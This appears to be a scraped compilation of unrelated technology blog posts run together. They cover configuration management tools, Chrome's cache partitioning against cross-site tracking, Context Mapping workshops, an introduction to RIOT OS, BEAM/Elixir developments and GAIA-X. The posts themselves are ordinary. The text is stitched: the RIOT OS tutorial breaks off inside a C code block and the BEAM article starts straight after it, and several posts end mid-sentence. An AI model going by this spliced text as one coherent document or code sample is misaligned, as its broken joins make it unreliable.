<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <p>In this article, you’ll learn the basics of Configuration Management tools so
that you can decide which one you need. Whether you’re looking to automate
your infrastructure management or are just browsing for future reference,
you’ll walk away with a handful of useful takeaways and insights.</p>
<p>We’ll start with what configuration management is and what it’s used for. Once
you understand its application, we’ll compare a few existing configuration
management tools and discuss their differences and overlapping features.</p>
<h2 id="what-is-configuration-management">What is Configuration Management?</h2>
<p><strong>Configuration Management (CM)</strong> is a systems engineering process that allows
you to configure your infrastructure and automate many tasks.</p>
<p>Traditionally, system administrators used to run scripts in batches to
configure new environments and keep them in the desired state. This intricate
process required manual documentation of every change, so human error was not
uncommon.</p>
<p>Then CM came into the picture. Think of it as an up-to-date inventory for all
of your assets, which include:</p>
<ul>
<li>Databases</li>
<li>Applications</li>
<li>Shared cache servers</li>
<li>A load balancer</li>
<li>Monitoring tools</li>
</ul>
<p>Now think about all of the config files on these servers (ini, xml, conf,
yaml). What about the packages, dependencies, and third-party libraries that
each server might require?</p>
<p>What if there was a tool that could aggregate all of that configuration, wrap
it around a central config file and always stay vigilant of any changes?</p>
<p>In the last decade, a plethora of configuration management tools hit the
software space. Tools like Ansible, Puppet, Salt, Chef, Terraform and many
more offer a wide range of capabilities to ease your infrastructure
development.</p>
<p>While they have many overlapping features, each software offers a unique set
of tools.</p>
<h2 id="why-is-configuration-management-important">Why is Configuration Management important?</h2>
<p>In the era of microservices, we shouldn’t configure each service manually:
it’s time-consuming and prone to human error. <strong>Configuration management
allows you to centralize and automate your infrastructure configuration.</strong></p>
<p>An average web application has at least one database, a shared cache server,
and a few web app instances. When scaling horizontally, it’s critical to be
able to change configuration quickly and revert in the case of disaster.</p>
<p>To minimize user impact, the architecture should be resilient and immune to
any outages.</p>
<p>CM enables you to tame your infrastructure, reduce operation costs and cut
downtime. Think of configuration management as an architectural framework of a
house - it provides a strong base for streamlined development.</p>
<h2 id="main-benefits-of-configuration-management">Main benefits of Configuration Management</h2>
<p><strong>Organization.</strong> Instead of piecing together scattered scripts, store your
configurations in a central location. This prevents firefighting and
unnecessary downtime. Controlling your entire infrastructure from one place
enables effective collaboration between teams. CM turns the most cumbersome
infrastructures into flexible architectures. It tracks changes, monitors
performance, and enforces consistency.</p>
<p><strong>Cost efficiency.</strong> Reduce the risk of security breaches by tracking
architectural changes. Cut costs by quickly scaling down when possible. CM
allows you to avoid wasteful duplication and eliminate redundant assets in
your cluster. Automating configuration can save you time and effort as your
architecture grows. Focus on infrastructure improvement, not maintenance.</p>
<p><strong>Rapid environment deployment.</strong> Repeatable configurations let you whip up a
sandbox cluster in a matter of minutes. Test new configuration updates and
roll them out in an incremental fashion without worrying about breaking
something.</p>
<p><strong>Stable infrastructure development.</strong> Infrastructure as Code (IaC) allows for
incremental and trackable updates to your infrastructure. Set up robust
environments with just a few lines of declarative code. Track your
infrastructure changes as part of the Software Development Life Cycle (SDLC)
to keep your system agile and your users happy.</p>
<p><strong>Hand a chunk of operations work to developers.</strong> By definition, development
seeks change while operations strives for stability. Even though DevOps merges
these two IT branches and helps to balance out their conflicting interests,
letting developers have control over their own architecture will only
streamline the overall development.</p>

<p>Now that we’ve discussed the software Configuration Management (CM) concept,
let’s clarify the idea of CM tools.</p>
<p>These are the tools that ensure consistency across the cluster of physical and
logical assets. Designed to automate the deployment, they facilitate
continuous integration and handle resource management across your
infrastructure.</p>
<p>Back in the day, manual configuration management was fraught with risks like
disruptions to application availability and data corruption. To alleviate
these, sysadmins strived to automate as many processes as possible by writing
scripts and executing them in batches. This is what led to the rise of
Configuration Management tools.</p>
<p>The first versions of major CM tools came out in the early 2000s. They mainly
relied on an imperative approach of running batch scripts to bring
environments to the desired state.</p>
<p>Within a decade, CM tools evolved into automation wizards and orchestration
maestros. Batch scripts have now been organized into a set of configuration
files that can spin up the entire environment with a simple keystroke.</p>

<p>The variety of CM tools can overwhelm even the most experienced sysadmin. To
pick the tool that’s right for you, consider the following:</p>
<p><strong>The community behind the technology.</strong> More established and mature
technologies seem to have a larger community of supporters. If you don’t plan
on buying enterprise support, this factor is essential - it might be your last
and the only line of defense when you run into problems. Although older
technologies might appear more mature and time-proven, they tend to be more
cumbersome.</p>
<p><strong>Purpose.</strong> How many existing systems will the CM tool need to configure and
integrate with? Will most of your environments serve operations or development
purposes? A system designed for operations staff will differ from one designed
for developers.</p>
<p><strong>Deployment frequency.</strong> Are you an agile development team that needs to ship
out changes several times a week? Or do you have more established applications
that require stability?</p>
<p><strong>User-friendly interface.</strong> Consider how comfortable your team members are
with Linux and the command line. Do they need a rich Graphical User Interface
or are they fine with a bare-bone terminal? What previous technologies have
they worked with?</p>
<p><strong>Organizational size.</strong> If your organization is large and has a complex
network of applications, choose a CM tool more conservatively. A mature,
widely-supported and highly secure product like Ansible would be the top
choice. It has a proven track record and a wide community of supporters.</p>
<p>There are many CM tools out there. However, as this is just an introduction to
configuration management, we’ll limit our choices to the few that stand out
the most (in our humble opinion).</p>

<p>Many CM tools have overlapping features, but each stands out in its own
special way. We’ll list the most prominent ones here to help you make the
right decision.</p>
<h3 id="ansible">Ansible</h3>
<p>With a market share of 27%, Red Hat’s <a href="https://www.ansible.com/" title="Red Hat's Ansible home page">Ansible</a> has the biggest community to
help you propel your development in times of architectural adversity. Being
the most versatile CM tool on the market, Ansible is trusted by Intel,
Atlassian, Cisco, Twitter, Verizon, and even NASA.</p>
<p>Best suited for automation, deployment and provisioning, this hefty CM tool
can handle the most complex IT workflows. Many benefits of Ansible make it the
top choice not only for large enterprises, but also for small organizations
and even startups.</p>
<p><strong>Agentless.</strong> Ansible’s push-based configuration approach leaves more
resources for your applications or simply allows you to remain lightweight.
The control node securely provisions all of its managed nodes or hosts through
SSH and doesn’t need to run any agents on remote servers. This makes it
convenient to add existing resources under configuration management.</p>
<p><strong>Readable syntax.</strong> Ansible’s Domain Specific Language is based on YAML and
is extended with templating ability. It lets you parameterize your playbooks
and keep sensitive data out of plain-text configuration until it hits its
final destination. The inventory file, which is used by Ansible as a map to
the infrastructure, can use a syntax similar to that of “ini”. However,
ini-style inventory is really only suitable for small scale deployments and
hello world demos. In all other use cases, we would probably use one either
YAML format or dynamic inventory.</p>
<p><strong>Wide selection of modules.</strong> When you install Ansible community edition, you
get access to over 4,000 modules that let you network with Windows and Linux
servers. If you ever need additional functionality, one of these modules most
likely offers it already.</p>
<p><strong>Reusability.</strong> Ansible can run your existing shell scripts so that you won’t
have to rewrite them. If you already have a semi-automated architecture,
Ansible can streamline your configuration management.</p>
<p><strong>Free.</strong> Ansible is an open-source and free software backed by a large
community. Many forums, stack overflow threads, and descriptive documentation
will always be within your reach should you run into any problems along your
configuration journey.</p>
<p>If you want to get up and running quickly while still ensuring consistency and
reliability, there is a big chance that Ansible could be your tool.</p>
<h3 id="puppet">Puppet</h3>
<p>Before Ansible hit the market a little less than a decade ago, <a href="https://puppet.com/" title="Puppet's home page">Puppet</a> was
the king of configuration management.</p>
<p>Unlike Ansible, Puppet takes a master-agent approach, requiring an agent on
every managed node. The master stores the code to define the desired state of
the entire infrastructure and delivers the individual configuration catalogs
to each agent. The node then brings itself to the desired state by applying
the configuration shipped from the master node.</p>
<p>It’s worth mentioning that …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>When I started doing web development, we all loaded jQuery from the official global jQuery CDN.</p><p>The idea was straightforward: if everybody loads the same jQuery script file (<code>cdn.jquery.com/jquery.latest.js</code> – or whatever URL it was back then), then the script file would be cached by the browsers, and other sites requesting the same script would benefit from the speedup of already cached resources. Users would have popular libraries like jQuery already sitting in their browser cache because earlier visited sites requested them.</p><p>This caching behavior was possible because, at the time, the browser's HTTP caches used the asset URL (<code>cdn.jquery.com/jquery.latest.js</code>) as a single cache key. Browsers use cache keys to figure out if and how to cache a resource. If these keys only consist of the resource URL, it allows the reuse of resources across sites and domains.</p><p>All this worked great, but as it is with many great inventions in web technology, <strong>cross-site resource caching enabled new ways to track users across different sites</strong>.</p><p>As an example, let's assume Facebook loads a unique file in their logged-in area (<code>fb-logo-ajgdmaks839–as.svg</code> – I totally made that file path up); if I would know the file path to such a file, request it on <code>stefanjudis.com</code> and see a rapid response coming from the browser cache, I can almost be sure that the user has logged into Facebook lately.</p><h2 id="new-http-cache-keys-in-google-chrome"><a href="#new-http-cache-keys-in-google-chrome">#</a> New HTTP cache keys in Google Chrome</h2><p><a href="https://bugs.webkit.org/show_bug.cgi?id=110269">Webkit (Safari) changed its caching strategy already in 2013</a> to prevent user tracking via the browser cache. Its cache keys are a combination of the requested resource URL and the top-level-domain requesting the resource.</p><p><em>☝️ Big thanks to <a href="https://twitter.com/tomayac/status/1317861511784792067?s=20">Thomas Steiner who gave input on that matter</a>.</em></p><p>On the bright side, this key structure prevents the mentioned tracking possibilities; unfortunately, it also leads to duplicated resources in the browser cache.</p><p>And... it hinders third-party resource sharing across the internet.</p><pre><code>Browsers duplicate resources with different keys:

cdn.jquery.com/jquery.latest.js-amazon.co.uk
cdn.jquery.com/jquery.latest.js-www.stefanjudis.com
</code></pre><p>Starting with v86, Chrome will be using combined cache keys, too. This change means that it's time to say goodbye to third-party resource-sharing across the web. <a href="https://www.statista.com/statistics/544400/market-share-of-internet-browsers-desktop/">With Chrome's market share of roughly 70%</a>, most browsers hitting our sites will use partitioned browser caches from now on. Chrome went for combining the top-level site URL, the current frame site URL, and the resource URL. This approach is more granular than what Safari does, but the result is the same.</p><p>If your sites request the global jQuery, modules from <a href="https://unpkg.com/">unpkg.com</a>, font files from <a href="https://fonts.google.com/">Google fonts</a> or GA's (Google Analytics) <code>analytics.js</code>, <strong>users will redownload the resources no matter if they downloaded and cached them for other sites already.</strong></p><p>What does this change mean for you? If your sites live on modern hosting that provides a CDN and supports HTTP/2, you can drop the third-parties and should ship all resources yourself. Relying on a third-party provides little value in 2020.</p><p>I have mixed feelings about these changes. It's excellent that browsers consider privacy, but it looks like anything can be misused for tracking purposes these days. I wonder where we're going with this... 😢</p><p>If you're interested in learning more on this topic you can give <a href="https://shkspr.mobi/blog/2020/10/please-stop-using-cdns-for-external-javascript-libraries/">Terence Eden's post "Please stop using CDNs for external Javascript libraries"</a> or <a href="https://andydavies.me/blog/2018/09/06/safari-caching-and-3rd-party-resources/">Andy Davies' post "Safari, Caching and Third-Party Resources"</a> a read, too.</p><p>And hey, this post was trending on Hacker News. 🎉 If you're interested, here's <a href="https://news.ycombinator.com/item?id=24894135">are the Hacker News comments</a>.</p></div></div>]]>

	<div>

		<p>Context Map was the first visualisation for the Bounded Context pattern from Domain-Driven Design. In a nutshell, it is a map of the different Bounded Contexts and their relationships. I tend to create a Context Map during or after a Big Picture EventStorming. Changing perspectives can be helpful, to challenge assumptions and get the best of different techniques.</p>

<p>However, sometimes it is hard to reach a consensus on the Context Map. I often operate in brownfield projects, with large organisations. Although people agree with the different bounded contexts, it is a process that takes time, and most significant energy. Which can lead to fatigue towards the method, and at the same time raises exciting patterns in the behaviours. But this blog post is not about emergent behaviour. :)</p>

<p>To tackle it, and inspired by the <a href="https://www.seanvantyne.com/2017/02/19/design-thinking-divergence-convergence-cycles/">Divergence and Convergence cycles</a> from Design Thinking, I start to apply the same pattern to my Context Mapping workshops. After a Big Picture EventStorming, I give the theory about Bounded Contexts and Context Mapping. You can find useful resources from the <a href="https://github.com/ddd-crew/context-mapping">DDD Crew</a>.</p>

<p>I split the group into small groups of 3 to 4 people. Each group needs to create a Context Map for their domain, using the output of the EventStorming. As they generate insights, they challenge the EventStorming, documenting it. We can have several rounds, timeboxed (the wonders of timeboxing). After that, each group do a show and tell about their reasoning and thought process. People can ask questions, challenging their model. As the process goes, we collect these questions and ideas. This is what I call the diverge phase. Each group creates their own version of the Context Map, but because the discussion is in small groups, it can be more effective.</p>

<p>The next phase is to start to converge. I ask one person to volunteer and to get all the bounded contexts from the different groups that are the <em>same</em>. In this case, we can get 50% to 80% of the Context Map done, with the advantage that is the part that people agree with each other. It avoids the fatigue of rehashing discussions. The next step in this phase is to start to decide on the “leftovers”, each needs more time to discuss. From my experience, this step is the most interesting one, because people have their own mental models about the bounded contexts. Focusing the energy to discuss the differences and trade-offs of the boundaries leads to a better outcome, and I can guide people over the discussion on the boundaries of the more complicated and complex problems. This last step can take a few hours, or a few sessions over time, depending on the size of the domain. As a rule of thumbs, I tend to split over multiple sessions, to allow people to think about it. Some of the best ideas happen in the shower!</p>

<p>You may ask if it is useful both physically and remotely. And the answer is yes. Physically you need more modelling space, where groups can discuss but not bias each other. Online you need tools that allow people to be isolated in their own room. In the end, it will produce the same output.</p>

<p>I’m wondering about your experiences. How do you get consensus over a Context Map?</p>

                    <p>All of us have used Operating Systems like Windows, Mac or a Linux distribution. I am sure you have wondered about the efforts that must have gone into implementing a system like this or maybe thought, "Oh I wish I could improve this, but how do I start with even understanding such a complex system". I have good news for you; after reading this blog, you will have a starting point to OS development.</p><h3 id="motivation">Motivation</h3><p>OS development in itself sounds a nice and cool but it seems so difficult at first. I realised how fun it is after working on my thesis to develop a complete network stack for an OS. </p><p>I found OS development has the following advantages with :</p><ol><li>Become proficient in low-level languages like C</li><li>Practical applications of theory for those who have taken courses like OS and faster grasping of concepts for others</li></ol><p>These are just a few from the top of my mind, but a fair warning, you probably won't be able to improve to Windows anyways for apparent reasons. </p><h3 id="prerequisites">Prerequisites</h3><p>The purpose of this blog is to inspire more people to start OS development regardless of their conceptual understanding of complex operating systems. However, it is better if you have preliminary knowledge of the following:</p><ul><li>Compiling and Running C code with features like <a href="https://www.programiz.com/c-programming/c-preprocessor-macros">macros</a> (preprocessing directives to make code smaller and more generic)</li><li><a href="https://www.tutorialspoint.com/makefile/index.htm">Makefile</a> (a build automation tool to compile your code automatically with the set of rules defined in the file)</li><li>GitHub</li></ul><h2 id="theory">Theory</h2><p>Before we go into the details of Operating Systems and their development, let me give a brief introduction to <strong>Process Scheduling</strong>. Readers who know this concept can skip this section.</p><p>Every task sent from one of the programs to the Processing Unit of the Computer has two major components, namely, IO and CPU parts. After doing the CPU part of the task, the CPU would essentially be ideal; therefore, to improve the overall efficiency, a scheduler is present to schedule the tasks as they come. In layman's terms, it decides what process will run on the CPU at a particular point in time. This part of the OS is called a process scheduler. The figure below shows an example of a simple process scheduler.</p><figure><img src="https://blog.bitsacm.in/content/images/2020/09/image-5.png"><figcaption>Process scheduler [3]</figcaption></figure><p>You can read more on this <a href="https://www.tutorialspoint.com/operating_system/os_processes.htm">blog</a>.</p><h2 id="operating-systems">Operating Systems</h2><p>The operating systems, as we know today, are way too complicated as beginners to work on, especially with the limited knowledge we have from our undergrad courses like Operating Systems, Computer Networks and DSA. Therefore here, I will introduce you to Operating Systems designed for low power embedded systems called <a href="https://en.wikipedia.org/wiki/Real-time_operating_system">Real-Time Operating Systems</a> (RTOS). Since the OS runs on hardware with limited resources(low memory and power), it has a reasonably simple construct which in-turn makes understanding the code and contributing to it much more manageable. For example, these operating systems do not need complex process schedulers due to the relative simplicity of the applications running on them. </p><p>In this blog, I will be talking about<a href="https://www.riot-os.org/"> RIOT OS</a>, which is a developing, Open-source RTOS.</p><h2 id="riot-os">RIOT OS</h2><figure><img src="https://blog.bitsacm.in/content/images/2020/09/riot-1.png"></figure><p>The most salient features of this operating system are:</p><ol><li>Can run on hardware with RAM and ROM as low as 1.5kB and 5kB respectively!</li><li>Support to over 100 different embedded device boards which makes it highly versatile and generic</li><li>Minimal hardware-dependent code</li><li>Code on Linux or Mac OS <a href="https://doc.riot-os.org/group__boards__native.html">natively</a>(explained later in the blog), deploy on embedded device</li><li>Highly active community with ~25 commits every day</li><li>Highly experienced people working on development, researchers from renowned Universities in France and Germany, so they know what they are doing</li><li>Conducive and active contributor community, hence providing a nurturing environment for new contributors</li><li>The best, its <strong>Open-Source</strong>, so you can modify the code for free and even contribute to it</li></ol><p>So, now let's delve into the operating system with a small introduction to the OS itself and then I will show you how to run a user application on the OS designed for IoT devices.</p><h3 id="riot-os-structure">RIOT OS Structure</h3><figure><img src="https://lh4.googleusercontent.com/BuhvNw7PM8jAGLsf_EFgVheuFhkmIzEgCdam8ee9u2VoS3uogk1jokvm-SOAxSkszNPbOXQeS534YbxT0H72jC7qz9YDglhyMt41hgI3z00YGIz68K-e9K8DlkFhGjnJ4W2ANu2Y"><figcaption>RIOT Structure [2]</figcaption></figure><p>The Image above gives an overview of RIOT structure which shows that RIOT OS, like any other RTOS, is logically divided into the following categories:</p><ul><li>Core/kernel: Implements the basic data structures and heart of the OS</li><li>Hardware: Implements the abstraction to interact with a micro-controller, hardware devices like radio devices, sensors, etc. The component includes CPU specific implementations, configuration for different boards which use those CPUs, supporting peripheral implementations like real-time clocks and drivers of various sensors.</li><li>System functionalities: Implements system libraries which are not part of the basic kernel like networking and file system</li><li>Packages: Implements support for all additional external libraries which are not a part of OS code</li><li>Applications: Implements high-level logic for use in actual applications.</li></ul><p>Don't worry if you don't exactly get what each component gets just yet. You will understand it as you work your way into the code and reach the registers on the micro-controller.</p><p>The user applications in RTOS are compiled and directly linked with the Operating System's code into one binary. This helps reducing final binary size, which is beneficial since the MCUs have low memory. This feature is in contrast to our traditional operating systems where we can run the application on top of the OS.</p><p>Now, the next question that comes to mind is that as a software developer how could you work on an Operating System that runs on separate hardware(micro-controller) which you may not want to buy (at least initially). RIOT developers have an excellent solution for this which simulates the hardware to run on your PC natively(more on this when we go through the example later in the blog). Also, there is an open-source test-bed on which one can openly deploy their code for testing at <a href="https://www.iot-lab.info/">FIT IoT-Lab</a>.</p><p>Another fantastic thing about the operating system is how the code design and the build system work together to make each module easily swappable. For example, if the user application only needs the shell, they only need to include the module corresponding to shell in the user application Makefile.</p><p>RIOT OS has <em>tickless priority-based</em> scheduler. It is a very primitive scheduler where the scheduler does not schedule processes according to time spent by the process on CPU. Instead, schedules processes according to the processes' priority. For example, the scheduler will schedule the process with lower priority (say, priority 5) only after all the higher priority processes(processes with priority 1-4) have finished executing. Such a primitive scheduler is there to reduce the complexity of the final system again due to limited computing resources (low computing power of the MCU). If you are interested to know more about how priority scheduling works, you can watch the <a href="https://youtu.be/cNdEQKw4apM">video</a>.</p><h3 id="default-example-of-riot">Default Example of RIOT</h3><h4 id="setting-up-your-pc">Setting up your PC</h4><p>So, the first task would be to get your pc ready to compile, flash (on an external hardware board, if any) and run the operating system. For this, you can follow the Tutorials provided on their website <a href="https://github.com/RIOT-OS/Tutorials/blob/master/README.md">[1]</a>. You would be installing essential tools like <code>git</code>, <code>make</code>, <code>gcc</code>, <code>openocd</code> (an open-source tool for debugging and flashing micro-controllers) and a <code>cross-compiler</code> which works with <code>gcc</code> to compile the code for arm based embedded devices.</p><h4 id="example-explained">Example explained</h4><p>After installing all the dependencies and cloning OS code from GitHub, you should go to the <code>./examples/default</code> directory in the riot folder which is a primitive example of application code running on the OS. We will use this default example as a reference in this blog. All the folders inside the examples folder represent example user applications running on the OS. There are two main components here, namely <code>main.c</code> and <code>Makefile</code>. The <code>main.c</code> file contains user application code. The <code>Makefile</code> is a file with some set of directives(rules stating to include some particular modules of the operating system) utilising make build tool(this tool essentially automates the compilation process) to generate the final binary.</p><figure><pre><code>#include "thread.h"

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        
        <small>2020-10-26</small>
        <p>The BEAM is the virtual machine that Erlang and Elixir runs on. It is widely cited as a battle-tested piece of software though I don’t know in which wars it has seen action. It has definitely paid its dues in the telecom space as well as globally scaled projects such as Whatsapp and Discord. It is well suited to tackle soft-realtime distributed systems with heavy concurrency. It has been a good platform chugging along. And with a small team at Ericsson responsible for much of its continuing development it has been managed in a deeply pragmatic way. Erlang has always been a bit of a secret and silent success. Almost no-one uses it if you look at market shares. But among the ones that use it there seems to be a very positive consensus. And then Elixir came and caused a bit of a boom. I think the BEAM has benefited from Elixir and Elixir wouldn’t exist without the BEAM. With that bit of background I’d like to shine a light on some cool developments that I think makes the BEAM more interesting or even uniquely interesting in the future.</p>
<h2 id="the-jit-is-here-soon-otp-24">The JIT is here (soon, OTP 24)</h2>
<p>With OTP 24 landing sometime next year we are going to get the a JIT for the BEAM. Based on the project <a href="https://github.com/asmjit/asmjit">AsmJit</a> this will mean that some BEAM code will be translated to native instructions. It will not be the kind of warm-up-for-performance-gains JIT that I’ve heard of in PyPy but rather significantly simpler. The goal of the project was to introduce a JIT that could give performance gains for some cases but would not cause any performance regressions. A pragmatic and laudable approach. Considering this made the Jason JSON-library (written in Elixir) beat the Jiffy JSON-library (written as a C NIF) in <strong>some</strong> tests I think this has the potential to obviate the need for some NIF implementations. Avoiding reaching out to the lower level code that is more capable but more dangerous is a good win.</p>
<p>Anyone running RabbitMQ should look forward to the update as measurements indicate 30-50% increased message throughput. Which is a nice thing to get for no code changes at all.</p>
<p>Pushing the performance of the BEAM closer to native is magnificent. To be clear the BEAM is already quite a good performer. I would put Erlang and Elixir at the abstraction level of languages like Python/Ruby/Node.js. Python and Ruby are poor performers. The Python ML stuff all goes into C++ or similar for performance. I’ve worked a bunch with Python and the things I hear from the Ruby world makes them sound quite equivalent in performance. They are a bit slow and can only <a href="https://underjord.io/more-than-one-thing-at-a-time.html">do one thing at a time</a>. Node.js is a bit different. It can do multiple things at a time, if you append asterisks and squint. It does it largely the same way Python + Gevent does it. This approach is incredibly susceptible to CPU-bound work causing head-of-line blocking. It becomes the single most important consideration for building a performant application “get to IO, don’t compute”. V8 that Node.js runs on is heavily optimized and fast for such a dynamic language. I think the BEAM provides a better approach that can deliver comparable results without as many footguns (opportunities for shooting yourself in the foot). But getting better at the raw crunching is a big gain with this JIT implementation and I look forward to the release.</p>
<h2 id="lumen---static-compilation--wasm">Lumen - Static compilation &amp; WASM</h2>
<p>The <a href="https://getlumen.org/">Lumen project</a> is a huge effort by a gang of open source developers and DockYard to implement a compiler (and more) that can take Elixir and Erlang into the browser. By solving that they end up solving static compilation for Erlang and Elixir as well. So this isn’t compiling and shipping the BEAM to the browser. This is a faithful reimplementation of the BEAM functionality in a way that allows it to be compiled statically. It uses LLVM and requires quite a bit of effort both in development and in wrangling the Web Assembly work group process stuff to make sure that the standard is not entirely run by Object-Oriented Programming needs.</p>
<p>I don’t think Lumen will replace the BEAM. The BEAM has a brilliant track record for long-running services and distributed computing that the Lumen project do not even attempt to achieve right now. Instead the Lumen project will allow Elixir and Erlang to move into spaces where the BEAM might be a bit too heavy and still provide the same guarantees. Typically I see it being good for command line tools, web frontends (super interesting to consider the Actor model going there), serverless/edge computing and potentially with WASM competing with Docker as a delivery mechanism for code in Kubernetes, using something like <a href="https://github.com/deislabs/krustlet">Krustlet</a> (<a href="https://player.fm/series/software-sessions/webassembly-on-the-server-with-krustlet">good podcast episode on WASM/Krustlet</a>). It’s probably Cloud Native or something. Who knows.</p>
<p>What gives Lumen the potential to be a better fit in these circumstances is that it can optimize for filesize (by cutting out hot code updates) and it is likely able to start much faster. Lumen is written in Rust. Which seems to be the popular choice around Web Assembly from what I’ve seen. Lumen is still an early release project and not fit for production. But it is beeing actively pushed forward.</p>
<h2 id="nerves---an-iot-platform-with-minimal-suck">Nerves - An IoT platform with minimal suck</h2>
<p>The <a href="https://www.nerves-project.org/">Nerves project</a> is fantastic. I’m a hardware hobbyist, not an IoT dev but I’ve worked a fair bit with Nerves and it is so, so good. What Nerves gives you when working with a Raspberry Pi for example is a way to let your code run all of the device. The BEAM is basically your operating system on top of a minimal Linux installation. The Linux you have is based on the solid foundation of Buildroot so it is quite feasible to modify it as you see fit. The big idea is that if you are running a Linux-level SBC already you might as well build on something that gives you the guarantees of the BEAM.</p>
<p>Beyond that the default setup encodes a lot of good embedded practices by default so that you avoid bricking devices with firmware updates, you get easy support for pushing firmware over the network or USB and much, much more.</p>
<p>There are a ton of good libraries for sensors and assorted hardware, as well as the common protocols like GPIO/SPI/I2C/UART. Networking support is well considered and has been reworked since I first started using Nerves a few years back (and it worked well then too). BLE is getting more and more good support recently.</p>
<p>The project also created <a href="https://www.nerves-project.org/nerveshub">NervesHub</a> which is a solution for managing a fleet of devices by securely providing firmware updates, allowing the switching on of a remote console on devices if that’s a need on your product. I think the most recent stuff is a UI revamp and some serious work on binary diffed patches to minimize firmware update sizes for data-constrained deployments.</p>
<p>This is very much a production project and people are shipping hardware with Nerves. It keeps marching forward.</p>
<h2 id="the-beam-can-be-your-entire-application">The BEAM can be your entire application</h2>
<p>Saša Jurić, author of the much-acclaimed Elixir in Action book has produced a library called <a href="https://github.com/sasa1977/site_encrypt">site_encrypt</a>. It allows you to handle LetsEncrypt configuration without a separate webserver or actually using certbot.</p>
<p>Now this library is good and meaningful in its own right but the underlying idea is why I bring it up. The BEAM can be your entire application. This is something I’ve realized over time. Where in Python you would reach for Gunicorn to run you Django app and Nginx to protect Gunicorn from the big bad world.. The BEAM is made for this. Introducing an intermediate layer of Nginx (or another HTTP server) might actually be detrimental in that you now have two things you need to configure correctly and two pools of multi-core processing workers that care about this request/response cycle and can independently screw it up.</p>
<p>The BEAM was always built for this. OTP has a lot weird corners where you find interesting libraries such as <code>wx</code> for WxWidgets (window management) and <code>ssh</code> for both SSH client and server work I believe. Because it is meant to be delivered as a full solution. It can run and manage multiple different types of work inside of it. Gracefully. It doesn’t replace Kubernetes for the large deployment or polyglot environments. But it might very well mean you don’t actually need to go there early. Or you can reduce how much Ops you need in your Dev. If your entire stack is Elixir or Erlang front to back I think you have empowered your developers significantly.</p>
<p>There is already a move towards this where tools are converging that give us a lot of things out of the box that we’d otherwise need to move outside our application for. These are pragmatic 80-90% solutions. The normal solutions are still all there if you need to reach for them. But maybe you don’t. I see these as moves in the same vein:</p>
<ul>
<li>LiveView - We can reduce the amount of frontend we need to build that isn’t BEAM code (Elixir or Erlang), in some cases get rid of it entirely.</li>
<li>Live Dashboard - Application insights right in your application stack instead of pushing them out to another solution.</li>
<li>Phoenix PubSub - Distributed PubSub without requiring coordination via something like Redis.</li>
<li>Phoenix Channels - Distributed PubSub over WebSockets using the above PubSub to coordinate delivery.</li>
<li>Phoenix Presence - Distribute Presence. A CRDT-powered thing for maintaining information about if someone is connected to a channel or not, like chatrooms and online/offline. Using Channels.</li>
</ul>
<p>Lowering complexity by keeping the solutions in a system you understand well is potentially very powerful. At some point many projects will need to pick up external dependencies such as Nginx, Redis or whatever. But I think there is something compelling about building your application inside a system that can do all of it quite well. Elixir and Phoenix already have significant mind-share in the startup world. I wouldn’t be surprised if this ends up being a very popular solution for startups. No frontend-specific code for the MVP, no New Relic or Mixpanel bill we make do with the Live Dashboard. Distribution is Erlang distribution + Swarm/Horde/Libcluster or something …</p></article></div>

<div> <div> <p> <span>Technical Concept</span> </p> <h2> How does GAIA-X work? </h2> </div>  </div> <div> <div> <div> <p>Federated services provide value if they are based on common standards which ensure transparency and interoperability. GAIA-X addresses this requirement by aligning network and interconnection providers, Cloud Solution Providers (CSP), High Performance Computing (HPC) as well as sector specific clouds and edge systems. Here, mechanisms are developed to find, combine and connect services from participating providers in order to enable a user-friendly infrastructure ecosystem. GAIA-X identifies the minimum technical requirements and services necessary to operate the federated GAIA-X Ecosystem. The development of these services will follow the principles of Security by Design and also include the concept of Privacy by Design in order to ensure highest security requirements and privacy protection.</p> <p>Technical implementation of these Federation Services will focus on the following areas:</p> <ul><li>the implementation of secure federated identity and trust mechanisms (security and privacy by design);</li><li>sovereign data services which ensure the identity of source and receiver of data and which ensure the access and usage rights towards the data;</li><li>easy access to the available providers, nodes and services. Data will be provided through federated catalogues; </li><li>the integration of existing standards to ensure interoperability and portability across infrastructure, applications and data; </li><li>the establishment of a compliance framework and Certification and Accreditation services; and</li><li>the contribution of a modular compilation of open source software and standards to support providers in delivering a secure, federated and interoperable infrastructure.</li></ul> <p>The initial set of federation services will be expanded. The roadmap is aligned with the development of ecosystem participants’ requirements.</p> </div> </div> </div> </div> <div id="id1839168" tabindex="-1"> <div> <div> <p> <span>GAIA-X in practice</span> </p> <h2> Use Cases: GAIA-X from the user perspective </h2> </div> <p>GAIA-X gives users access to a broad and highly useful range of specialised products and services from cloud providers, thus enabling the use of tailored solutions. In this context, GAIA-X offers full transparency through the self-description, provides certified data protection and supplies regulatory criteria for the products and services offered.</p>  </div> <div> <div> <div> <p>Clear conditions for participation in GAIA-X and for collaboration, and common rules for cross-company authentication and access management will strengthen the underlying level of trust, bring down the obstacles to participation and reduce the amount of work involved in bilateral coordination between individual users.</p> <p>A further important added benefit of GAIA-X is the guarantee of data sovereignty: Each user decides for herself where her data is stored, as well as who may process it and for what purpose, based on the user’s own data classification. In that sense GAIA-X enables modular solutions. Users can also access AI applications and data pools via the trustworthy data infrastructure. Based on standardisation rules and the different options for managing and controlling the transfer of data, data can be exchanged between the companies, linked with other data, processed, evaluated, and monetised in value creation networks. The opportunities of data and service sharing can promote innovations, exploit synergies and enable new business models to be developed and scaled up. </p> <p>The aim of Workstream 1 ‘User ecosystems and requirements’ is to achieve the stated added benefits through a broad and sustained mobilisation of the user and demand perspective. This occurs through continual identification, integration, development and implementation of domain-specific use cases, which illustrate the need for and the added benefit of a sovereign European data infrastructure. The work also focuses on defining domain-specific and cross-domain requirements. These form the foundation for the growth of data infrastructures.</p> <p>In the meantime, more than 40 use cases have been submitted in eight domains (‘Industry 4.0/SME’, ‘Health’, ‘Finance’, ‘Public Sector’, ‘Smart Living’, ‘Energy’, ‘Mobility’ and ‘Agriculture’). They come from various companies and organisations from European countries, including Germany, France, the Netherlands, Spain and Switzerland. On the one hand, they illustrate need for and the added benefit of GAIA-X. On the other hand, they each represent a domain and serve as basis to identify and validate domain-specific and cross-domain requirements and to allow these to be incorporated into the development of GAIA-X.</p> <p>All project participants are invited to participate in Workstream 1 ‘User Ecosystems and Requirements’: Both by submitting new use cases and by active and continuous participation in a domain-specific working group. The establishment of further domains is 